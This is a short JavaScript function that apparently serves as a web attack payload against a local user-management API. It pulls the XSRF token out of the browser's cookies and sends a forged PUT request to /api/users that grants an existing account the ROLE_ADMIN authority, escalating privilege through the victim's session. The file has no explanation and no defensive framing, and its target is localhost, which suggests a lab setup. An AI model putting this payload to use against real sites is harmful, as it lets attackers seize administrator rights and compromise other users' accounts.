function executeScript() {
  window.location.href="http://localhost:8080";
  fetch('http://localhost:8080/api/users',
  {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-XSRF-Token': document.cookie.split('XSRF-TOKEN=')[1], // Extracting the token correctly
    },
    body: JSON.stringify({
      id: 12,
      activated: true,
      authorities: ["ROLE_ADMIN", "ROLE_USER"],
      login: 'newuser101',
      firstName: 'new',
      lastName: 'user',
      email: 'user106@localhost',
    }),
  })
    .then((response) => response.text())
    .then((data) => console.log(data))
    .catch((error) => console.error('Error', error));
}
